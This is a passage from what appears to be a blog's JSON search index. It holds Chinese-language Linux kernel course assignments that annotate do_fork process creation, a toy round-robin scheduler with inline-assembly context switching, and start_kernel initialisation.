//初始化定时器结构\rinit_timer( \u0026amp;p-\u0026gt;real_timer );\rp-\u0026gt;real_timer.data = (unsigned long)p;\rp-\u0026gt;leader = 0 ;\rp-\u0026gt;tty_old_pgrp = 0 ;\rp-\u0026gt;times.tms_utime = p-\u0026gt;times.tms_stime = 0 ; //初始化进程的各种运行时间\rp-\u0026gt;times.tms_cutime = p-\u0026gt;times.tms_cstime = 0 ;\r#ifdef CONFIG_SMP //初始化对称处理器成员\r{\rint i;\rp-\u0026gt;cpus_runnable = ~0UL;\rp-\u0026gt;processor = current-\u0026gt;processor ;\rfor( i = 0 ; i \u0026lt; smp_num_cpus ; i++ )\rp-\u0026gt;per_cpu_utime[ i ] = p-\u0026gt;per_cpu_stime[ i ] = 0;\rspin_lock_init ( \u0026amp;p-\u0026gt;sigmask_lock );\r}\r#endif\rp-\u0026gt;lock_depth = -1 ; // 注意：这里 -1 代表 no ,表示在上下文切换时，内核不上锁\rp-\u0026gt;start_time = jiffies ; // 设置进程的起始时间\rINIT_LIST_HEAD ( \u0026amp;p-\u0026gt;local_pages );\rretval = -ENOMEM ;\rif ( copy_files ( clone_flags , p )) //拷贝父进程的 files 指针，共享父进程已打开的文件\rgoto bad_fork_cleanup ;\rif ( copy_fs ( clone_flags , p )) //拷贝父进程的 fs 指针，共享父进程文件系统\rgoto bad_fork_cleanup_files ;\rif ( copy_sighand ( clone_flags , p )) //子进程共享父进程的信号处理函数指针\rgoto bad_fork_cleanup_fs ;\rif ( copy_mm ( clone_flags , p ))\rgoto bad_fork_cleanup_mm ; //拷贝父进程的 mm 信息，共享存储管理信息\rretval = copy_thread( 0 , clone_flags , stack_start, stack_size , p regs );\r//初始化 TSS、LDT以及GDT项\rif ( retval )\rgoto bad_fork_cleanup_mm ;\rp-\u0026gt;semundo = NULL ; //初始化信号量成员\rp-\u0026gt;prent_exec_id = p-self_exec_id ;\rp-\u0026gt;swappable = 1 ; //进程占用的内存页面可换出\rp-\u0026gt;exit_signal = clone_flag \u0026amp; CSIGNAL ;\rp-\u0026gt;pdeatch_signal = 0 ; //注意：这里是父进程消亡后发送的信号\rp-\u0026gt;counter = (current-\u0026gt;counter + 1) \u0026gt;\u0026gt; 1 ;//进程动态优先级，这里设置成父进程的一半,应注意的是，这里是采用位操作来实现的。\rcurrent-\u0026gt;counter \u0026gt;\u0026gt; =1;\rif ( !current-\u0026gt;counter )\rcurrent-\u0026gt;need_resched = 1 ; //置位重新调度标记，实际上从这个地方开始，分裂成了父子两个进程。\rretval = p-\u0026gt;pid ;\rp-\u0026gt;tpid = retval ;\rINIT_LIST_HEAD( \u0026amp;p-\u0026gt;thread_group );\rwrite_lock_irq( \u0026amp;tasklist_lock );\rp-\u0026gt;p_opptr = current-\u0026gt;p_opptr ;\rp-\u0026gt;p_pptr = current-\u0026gt;p_pptr ;\rif ( !( clone_flags \u0026amp; (CLONE_PARENT | CLONE_THREAD ))) {\rp-\u0026gt;opptr = current ;\rif ( !(p-\u0026gt;ptrace \u0026amp; PT_PTRACED) )\rp-\u0026gt;p_pptr = current ;\r}\rif ( clone_flags \u0026amp; CLONE_THREAD ){\rp-\u0026gt;tpid = current-\u0026gt;tpid ;\rlist_add ( \u0026amp;p-\u0026gt;thread_group,\u0026amp;current-\u0026gt;thread_group );\r}\rSET_LINKS(p);\rhash_pid(p);\rnr_threads++;\rwrite_unlock_irq( \u0026amp;tasklist_lock );\rif ( p-\u0026gt;ptrace \u0026amp; PT_PTRACED )\rsend_sig( SIGSTOP , p ,1 );\rwake_up_process(p); //把新进程加入运行队列，并启动调度程序重新调度，使新进程获得运行机会\r++total_forks ; if ( clone_flags \u0026amp; CLONE_VFRK )\rwait_for_completion(\u0026amp;vfork);\r//以下是出错处理部分\rfork_out:\rreturn retval;\rbad_fork_cleanup_mm:\rexit_mm(p);\rbad_fork_cleanup_sighand:\rexit_sighand(p);\rbad_fork_cleanup_fs:\rexit_fs(p);\rbad_fork_cleanup_files:\rexit_files(p);\rbad_fork_cleanup:\rput_exec_domain( p-\u0026gt;exec_domain );\rif ( p-\u0026gt;binfmt \u0026amp;\u0026amp; p-\u0026gt;binfmt-\u0026gt;module )\r__MOD_DEC_USE_COUNT( p-\u0026gt;binfmt-\u0026gt;module );\rbad_fork_cleanup_count:\ratomic_dec( \u0026amp;p-\u0026gt;user-\u0026gt;processes );\rfree_uid ( p-\u0026gt;user );\rbad_fork_free:\rfree_task_struct(p);\rgoto fork_out;\r}\r 实验 实验是在实验楼完成的:\n总结: 新进程的执行起点为: ret_form_fork\n当他从ret_from_fork退出时，会从堆栈中弹出原来保存的eip，而ip指向kernel_thread_helper,\n至此kernel_thread_helper被调用，他就能够运行我们的指定的函数了do_exit(). do_fork的执行流程可如下图表示:\n图摘自: Linux进程切换\n","date":1425733467,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425733467,"objectID":"b237d04f3dd6a0b7f81e8bd9b96277d2","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-building-task/","publishdate":"2015-03-07T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-building-task/","section":"post","summary":"Linux内核课第六周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程6_进程创建","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第二周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n计算机是如何工作的（小结） 概念 计算机的工作，一言以蔽之：执行程序的过程；也就是存储程序和 程序控制的过程。\n 存储程序计算机工作模型，计算机系统最最基础性的逻辑结构 函数调用堆栈，高级语言得以运行的基础 中断，多道程序操作系统的基点  以例分析  一个简单的中断的例子(点击进入)\n简要分析mymain.c与myinterrupt.c void __init my_start_kernel(void) // mymain.c中主要内容 { int i = 0; while (1) { i++; if (i % 100000 == 0) //每循环十万次打印一次my_start_kernel here printk(KERN_NOTICE \u0026quot;my_start_kernel here %d \\n\u0026quot;, i); } } void my_timer_handler(void) //每次时钟中断调用一次 myinterrupt.c中主要内容 { printk(KERN_NOTICE \u0026quot;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\\n\\n\u0026quot;); }  可见，这只是一个很简单的时钟中断演示实验，执行结果如下所示：\n可以清楚的看到，时钟每记数到十万的时候，打印一个my_start_kernel here，时钟中断的时候执行my_time_hander here.\n在第一个的基础上进行时间片轮转多道程序的小os. 主要对mypcb.h, mymain.c 和myinterrupt.c这三个文件进行分析\n mypcb.h  / * linux/mykernel/**mypcb.h** * Kernel internal PCB types * Copyright (C) 2013 Mengning */ #define MAX_TASK_NUM 4 #define KERNEL_STACK_SIZE 1024*8 /* CPU-specific state of this task */ struct Thread {//给任务定义一个eip和esp unsigned longip; unsigned longsp; }; typedef struct PCB{ int pid;//任务编号 volatile long state;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ char stack[KERNEL_STACK_SIZE]; //定义栈空间 /* CPU-specific state of this task */ struct Thread thread; //定义进程的结构体thread, 其中有eip和esp unsigned longtask_entry;//任务的函数起始处, 也就是任务第一次执行的起始位置 struct PCB *next;//一个任务链表, 指向下一个任务 }tPCB; void my_schedule(void);//任务调动函数**  mymain.c  /* linux/mykernel/mymain.c * Kernel internal my_start_kernel * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; //引入其中两个结构体表示** tPCB task[MAX_TASK_NUM];//定义两个数组 tPCB * my_current_task = NULL; volatile int my_need_sched = 0;//定义是否调度, 1则调度, 0则不调度 void my_process(void); void __init my_start_kernel(void) **//起始函数位置** { int pid = 0; int i; /* Initialize process 0*/ task[pid].pid = pid; task[pid].state = 0;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ task[pid].task_entry = task[pid].thread.ip = (unsigned long)my_process; task[pid].thread.sp = (unsigned long)\u0026amp;task[pid].stack[KERNEL_STACK_SIZE-1]; //0号进程栈在最开始的位置** task[pid].next = \u0026amp;task[pid];//下一个任务也是自己，在这里，其他任务还没有创建 /*fork more process *///创建多个任务 for(i=1;i\u0026lt;MAX_TASK_NUM;i++) { memcpy(\u0026amp;task[i],\u0026amp;task[0],sizeof(tPCB));//复制0号进程的结构形式 task[i].pid = i; task[i].state = -1;//初始的任务(除0号进程外)都设置成未运行 task[i].thread.sp = (unsigned long)\u0026amp;task[i].stack[KERNEL_STACK_SIZE-1]; task[i].next = task[i-1].next;//新fork的进程加到进程链表的尾部, 该新建任务的next指向上一个任务的next,也就是自己（最后一个） task[i-1].next = \u0026amp;task[i]; //配置上一个任务的next指向这时候新创建的任务 } /* start process 0 by task[0] */ pid = 0; my_current_task = \u0026amp;task[pid];//先让0号进程先执行 asm volatile( \u0026quot;movl %1,%%esp\\n\\t\u0026quot; /* set task[pid].thread.sp to esp */ \u0026quot;pushl %1\\n\\t\u0026quot; /* push ebp ,当前esp=ebp*/ \u0026quot;pushl %0\\n\\t\u0026quot; /* push task[pid].thread.ip */ \u0026quot;ret\\n\\t\u0026quot; /* pop task[pid].thread.ip to eip */ \u0026quot;popl %%ebp\\n\\t\u0026quot; : : \u0026quot;c\u0026quot; (task[pid].thread.ip),\u0026quot;d\u0026quot; (task[pid].thread.sp) ); } void my_process(void) { int i = 0; while(1) { i++; if(i%10000000 == 0) { printk(KERN_NOTICE \u0026quot;this is process %d -\\n\u0026quot;,my_current_task-\u0026gt;pid); if(my_need_sched == 1)//判断是否调度；该值可有itnerrupt.c中的函数来配置 { my_need_sched = 0; my_schedule(); //主动调动的机制 } printk(KERN_NOTICE \u0026quot;this is process %d +\\n\u0026quot;,my_current_task-\u0026gt;pid); } } }  myinterrupt.c  /* linux/mykernel/myinterrupt.c * Kernel internal my_timer_handler * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; extern tPCB task[MAX_TASK_NUM]; extern tPCB * my_current_task; extern volatile int my_need_sched; volatile int time_count = 0; /* * Called by timer interrupt. * it runs in the name of current running process, * so it use kernel stack of current running process */ void my_timer_handler(void) { #if 1 if(time_count%1000 == 0 \u0026amp;\u0026amp; my_need_sched != 1)//时钟中断1000次的时候，调度一次, 配置调度值为1 { printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); my_need_sched = 1; } time_count ++ ; #endif return; } void my_schedule(void) //调度函数, 核心函数 { tPCB * next;//定义两个指针 tPCB * prev; if(my_current_task == NULL //当前进程和下一进程为空, 即没有任务, 返回 || my_current_task-\u0026gt;next == NULL) { return; } printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_schedule\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); /* 在调度函数中, next指向的是下一个将要被调度的任务, prev指向的是当前正在运行的任务*/ /* schedule */ next = my_current_task-\u0026gt;next;//把当前进程的下一个进程赋值给next，当前进程赋值给prev prev = my_current_task; if(next-\u0026gt;state == 0)/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ //如果下一个任务不是第一次被调度, 则执行 { /* switch to next process——这个时候下一个进程有进程上下文 */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save 当前进程 ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save 当前 esp 赋值到prev.thread.sp */ \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore 下一个进程的sp到 esp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save 当前进程的 eip */ \u0026quot;pushl %3\\n\\t\u0026quot; //保存下一个进程eip保存到栈里面 \u0026quot;ret\\n\\t\u0026quot; /* restore eip */ \u0026quot;1:\\t\u0026quot; /* next process start here */ \u0026quot;popl %%ebp\\n\\t\u0026quot;** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip)** : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip)** ); my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); } else//下一个进程为第一次运行时,没有进程上下文, 则以下面这种方式来处理 { next-\u0026gt;state = 0; my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); /* switch to new process */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save esp */x` \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore esp */ \u0026quot;movl %2,%%ebp\\n\\t\u0026quot; /* restore ebp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save eip */ \u0026quot;pushl %3\\n\\t\u0026quot;** \u0026quot;ret\\n\\t\u0026quot; /* restore eip */** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip) : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip) ); } return; }  以新任务切换为例进行堆栈变化分析：\n执行结果如下图所示：\n","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"18e4d1e6c3708e53658f326075dfedb0","permalink":"http://www.guozet.me/post/Linux-Kernel-analysis-Os-work-copy/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-Kernel-analysis-Os-work-copy/","section":"post","summary":"Linux内核课第二周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程2_操作系统是如何工作的","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第二周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n计算机是如何工作的（小结） 概念 计算机的工作，一言以蔽之：执行程序的过程；也就是存储程序和 程序控制的过程。\n 存储程序计算机工作模型，计算机系统最最基础性的逻辑结构 函数调用堆栈，高级语言得以运行的基础 中断，多道程序操作系统的基点  以例分析  一个简单的中断的例子(点击进入)\n简要分析mymain.c与myinterrupt.c void __init my_start_kernel(void) // mymain.c中主要内容 { int i = 0; while (1) { i++; if (i % 100000 == 0) //每循环十万次打印一次my_start_kernel here printk(KERN_NOTICE \u0026quot;my_start_kernel here %d \\n\u0026quot;, i); } } void my_timer_handler(void) //每次时钟中断调用一次 myinterrupt.c中主要内容 { printk(KERN_NOTICE \u0026quot;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\\n\\n\u0026quot;); }  可见，这只是一个很简单的时钟中断演示实验，执行结果如下所示：\n可以清楚的看到，时钟每记数到十万的时候，打印一个my_start_kernel here，时钟中断的时候执行my_time_hander here.\n在第一个的基础上进行时间片轮转多道程序的小os. 主要对mypcb.h, mymain.c 和myinterrupt.c这三个文件进行分析\n mypcb.h  / * linux/mykernel/**mypcb.h** * Kernel internal PCB types * Copyright (C) 2013 Mengning */ #define MAX_TASK_NUM 4 #define KERNEL_STACK_SIZE 1024*8 /* CPU-specific state of this task */ struct Thread {//给任务定义一个eip和esp unsigned longip; unsigned longsp; }; typedef struct PCB{ int pid;//任务编号 volatile long state;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ char stack[KERNEL_STACK_SIZE]; //定义栈空间 /* CPU-specific state of this task */ struct Thread thread; //定义进程的结构体thread, 其中有eip和esp unsigned longtask_entry;//任务的函数起始处, 也就是任务第一次执行的起始位置 struct PCB *next;//一个任务链表, 指向下一个任务 }tPCB; void my_schedule(void);//任务调动函数**  mymain.c  /* linux/mykernel/mymain.c * Kernel internal my_start_kernel * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; //引入其中两个结构体表示** tPCB task[MAX_TASK_NUM];//定义两个数组 tPCB * my_current_task = NULL; volatile int my_need_sched = 0;//定义是否调度, 1则调度, 0则不调度 void my_process(void); void __init my_start_kernel(void) **//起始函数位置** { int pid = 0; int i; /* Initialize process 0*/ task[pid].pid = pid; task[pid].state = 0;/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ task[pid].task_entry = task[pid].thread.ip = (unsigned long)my_process; task[pid].thread.sp = (unsigned long)\u0026amp;task[pid].stack[KERNEL_STACK_SIZE-1]; //0号进程栈在最开始的位置** task[pid].next = \u0026amp;task[pid];//下一个任务也是自己，在这里，其他任务还没有创建 /*fork more process *///创建多个任务 for(i=1;i\u0026lt;MAX_TASK_NUM;i++) { memcpy(\u0026amp;task[i],\u0026amp;task[0],sizeof(tPCB));//复制0号进程的结构形式 task[i].pid = i; task[i].state = -1;//初始的任务(除0号进程外)都设置成未运行 task[i].thread.sp = (unsigned long)\u0026amp;task[i].stack[KERNEL_STACK_SIZE-1]; task[i].next = task[i-1].next;//新fork的进程加到进程链表的尾部, 该新建任务的next指向上一个任务的next,也就是自己（最后一个） task[i-1].next = \u0026amp;task[i]; //配置上一个任务的next指向这时候新创建的任务 } /* start process 0 by task[0] */ pid = 0; my_current_task = \u0026amp;task[pid];//先让0号进程先执行 asm volatile( \u0026quot;movl %1,%%esp\\n\\t\u0026quot; /* set task[pid].thread.sp to esp */ \u0026quot;pushl %1\\n\\t\u0026quot; /* push ebp ,当前esp=ebp*/ \u0026quot;pushl %0\\n\\t\u0026quot; /* push task[pid].thread.ip */ \u0026quot;ret\\n\\t\u0026quot; /* pop task[pid].thread.ip to eip */ \u0026quot;popl %%ebp\\n\\t\u0026quot; : : \u0026quot;c\u0026quot; (task[pid].thread.ip),\u0026quot;d\u0026quot; (task[pid].thread.sp) ); } void my_process(void) { int i = 0; while(1) { i++; if(i%10000000 == 0) { printk(KERN_NOTICE \u0026quot;this is process %d -\\n\u0026quot;,my_current_task-\u0026gt;pid); if(my_need_sched == 1)//判断是否调度；该值可有itnerrupt.c中的函数来配置 { my_need_sched = 0; my_schedule(); //主动调动的机制 } printk(KERN_NOTICE \u0026quot;this is process %d +\\n\u0026quot;,my_current_task-\u0026gt;pid); } } }  myinterrupt.c  /* linux/mykernel/myinterrupt.c * Kernel internal my_timer_handler * Copyright (C) 2013 Mengning */ #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/string.h\u0026gt; #include \u0026lt;linux/ctype.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026quot;mypcb.h\u0026quot; extern tPCB task[MAX_TASK_NUM]; extern tPCB * my_current_task; extern volatile int my_need_sched; volatile int time_count = 0; /* * Called by timer interrupt. * it runs in the name of current running process, * so it use kernel stack of current running process */ void my_timer_handler(void) { #if 1 if(time_count%1000 == 0 \u0026amp;\u0026amp; my_need_sched != 1)//时钟中断1000次的时候，调度一次, 配置调度值为1 { printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_timer_handler here\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); my_need_sched = 1; } time_count ++ ; #endif return; } void my_schedule(void) //调度函数, 核心函数 { tPCB * next;//定义两个指针 tPCB * prev; if(my_current_task == NULL //当前进程和下一进程为空, 即没有任务, 返回 || my_current_task-\u0026gt;next == NULL) { return; } printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;my_schedule\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;); /* 在调度函数中, next指向的是下一个将要被调度的任务, prev指向的是当前正在运行的任务*/ /* schedule */ next = my_current_task-\u0026gt;next;//把当前进程的下一个进程赋值给next，当前进程赋值给prev prev = my_current_task; if(next-\u0026gt;state == 0)/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ //如果下一个任务不是第一次被调度, 则执行 { /* switch to next process——这个时候下一个进程有进程上下文 */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save 当前进程 ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save 当前 esp 赋值到prev.thread.sp */ \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore 下一个进程的sp到 esp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save 当前进程的 eip */ \u0026quot;pushl %3\\n\\t\u0026quot; //保存下一个进程eip保存到栈里面 \u0026quot;ret\\n\\t\u0026quot; /* restore eip */ \u0026quot;1:\\t\u0026quot; /* next process start here */ \u0026quot;popl %%ebp\\n\\t\u0026quot;** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip)** : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip)** ); my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); } else//下一个进程为第一次运行时,没有进程上下文, 则以下面这种方式来处理 { next-\u0026gt;state = 0; my_current_task = next; printk(KERN_NOTICE \u0026quot;\u0026gt;\u0026gt;\u0026gt;switch %d to %d\u0026lt;\u0026lt;\u0026lt;\\n\u0026quot;,prev-\u0026gt;pid,next-\u0026gt;pid); /* switch to new process */ asm volatile( \u0026quot;pushl %%ebp\\n\\t\u0026quot; /* save ebp */ \u0026quot;movl %%esp,%0\\n\\t\u0026quot; /* save esp */x` \u0026quot;movl %2,%%esp\\n\\t\u0026quot; /* restore esp */ \u0026quot;movl %2,%%ebp\\n\\t\u0026quot; /* restore ebp */ \u0026quot;movl $1f,%1\\n\\t\u0026quot; /* save eip */ \u0026quot;pushl %3\\n\\t\u0026quot;** \u0026quot;ret\\n\\t\u0026quot; /* restore eip */** : \u0026quot;=m\u0026quot; (prev-\u0026gt;thread.sp),\u0026quot;=m\u0026quot; (prev-\u0026gt;thread.ip) : \u0026quot;m\u0026quot; (next-\u0026gt;thread.sp),\u0026quot;m\u0026quot; (next-\u0026gt;thread.ip) ); } return; }  以新任务切换为例进行堆栈变化分析：\n执行结果如下图所示：\n","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"28c021ae3e7229dc3cfba46758c3cea5","permalink":"http://www.guozet.me/post/Linux-Kernel-analysis-Os-work/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-Kernel-analysis-Os-work/","section":"post","summary":"Linux内核课第二周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程2_操作系统是如何工作的","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第三周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n分析Start_kernel函数 我使用的是linux-2.6.14的源代码来分析的。在这里突出重点，主要来分析start_kernel这个函数中的大致实现。开机启动到start_kernel这个过程主要是汇编来实现的，具体可参考\n  linux kernel 从入口到start_kernel 的代码分析  start_kernel()这个函数是内核由引导程序引导以后，由自解压程序解压以后执行的第一个函数，可以认为是整个内核的入口函数，start_kernel()做的工作就是线性的初始化一些内核的基础机制，如中断，内存管理，进程管理，信号，文件系统，KO等！最后就启动一个init线程，init线程再读取文件系统里的init程序，做为系统的第一个进程而存在！\nstart_kernel源码如下：\n\u0026lt;span style=\u0026quot;font-size:14px;\u0026quot;\u0026gt;asmlinkage void __init start_kernel(void) { char * command_line; //命令行，用来存放bootloader传递过来的参数 extern struct kernel_param __start___param[], __stop___param[];\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;//这两个变量为地址指针，指向内核启动参数处理相关结构体在内存的位置， \u0026lt;/span\u0026gt; lock_kernel();\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;//建立一个哈希表(hash tables)，就是一个前后指向的指针结构体数组。\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;【函数的主要作用是初始化锁的状态跟踪模块。由于内核大量使用锁来进行多进程多处理器的同步操作，死锁就会在代码不合理的时候出现，但是要定位哪个锁比较困难，用哈希表可以跟踪锁的使用状态。死锁情况：一个进程递归加锁同一把锁；同一把锁在两次中断中加锁；几把锁形成闭环死锁】\u0026lt;/span\u0026gt; page_address_init(); //初始化高端内存的映射表 printk(KERN_NOTICE); //打印信息 printk(linux_banner); //打印Linux的版本信息 setup_arch(\u0026amp;command_line); \u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt;//内核架构相关初始化函数，是非常重要的一个初始化步骤。其中包含了处理器相关参数的初始化、内核启动参数(tagged list)的获取和前期处理、内存子系统的早期初始化(bootmem分配器)\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif; font-size: 12px;\u0026quot;\u0026gt; setup_per_cpu_areas();\u0026lt;/span\u0026gt; smp_prepare_boot_cpu();//为SMP系统里引导CPU(boot-cpu)进行准备工作。在ARM系统单核里是空函数 sched_init();\u0026lt;span style=\u0026quot;white-space:pre\u0026quot;\u0026gt;\t\u0026lt;/span\u0026gt;//对进程调度器的数据结构进行初始化，创建运行队列，设置当前任务的空线程，当前任务的调度策略为CFS调度器 preempt_disable(); //关闭优先级调度。由于每个进程任务都有优先级，目前系统还没有完全初始化，还不能打开优先级调度。 build_all_zonelists(); page_alloc_init(); //设置内存页分配通知器 printk(KERN_NOTICE \u0026quot;Kernel command line: %s\\n\u0026quot;, saved_command_line); //输出命令参数到显示终端 parse_early_param(); //解析cmdline中的启动参数 parse_args(\u0026quot;Booting kernel\u0026quot;, command_line, __start___param, __stop___param - __start___param, \u0026amp;unknown_bootoption); //这行代码主要对传入内核参数进行解释，如果不能识别的命令就调用最后参数的函数 sort_main_extable();//对内核异常表(exception table)按照异常向量号大小进行排序，以便加速访问 trap_init(); //对内核陷阱异常进行初始化，初始化一些中断向量，在ARM系统里是空函数，没有任何的初始化 rcu_init(); //初始化直接读拷贝更新的锁机制。 Read-Copy Update 【RCU主要提供在读取数据机会比较多，但更新比较的少的场合，这样减少读取数据锁的性能低下的问题。】 init_IRQ();\u0026lt;span style=\u0026quot;white-space:pre\u0026quot;\u0026gt;\t\u0026lt;/span\u0026gt;//对应架构特定的中断初始化函数，在ARM中就是machine_desc-\u0026gt;init_irq()，就是运行设备描述结构体中的init_irq函数[arch/arm/mach-msm/board-xxx.c] pidhash_init(); init_timers();\u0026lt;span style=\u0026quot;white-space:pre\u0026quot;\u0026gt;\t\u0026lt;/span\u0026gt; //初始化引导CPU的时钟相关的数据结构，注册时钟的回调函数，当时钟到达时可以回调时钟处理函数，最后初始化时钟软件中断处理 //初始化定时器,开启定时器软中断服务以及注册服务程序以及初始化各CPU中的tev_base等init_timers()-\u0026gt;run_timer_softirq()-\u0026gt;__run_timers().. softirq_init(); //初始化软件中断，软件中断与硬件中断区别就是中断发生时，软件中断是使用线程来监视中断信号，而硬件中断是使用CPU硬件来监视中断。 time_init(); //初始化系统时钟。开启一个硬件定时器，开始产生系统时钟就是system_timer的初始化,arch/arm/mach-msm/board-*.c console_init(); if (panic_later) panic(panic_later, panic_param); profile_init(); local_irq_enable(); #ifdef CONFIG_BLK_DEV_INITRD if (initrd_start \u0026amp;\u0026amp; !initrd_below_start_ok \u0026amp;\u0026amp; initrd_start \u0026lt; min_low_pfn \u0026lt;\u0026lt; PAGE_SHIFT) { printk(KERN_CRIT \u0026quot;initrd overwritten (0x%08lx \u0026lt; 0x%08lx) - \u0026quot; \u0026quot;disabling it.\\n\u0026quot;,initrd_start,min_low_pfn \u0026lt;\u0026lt; 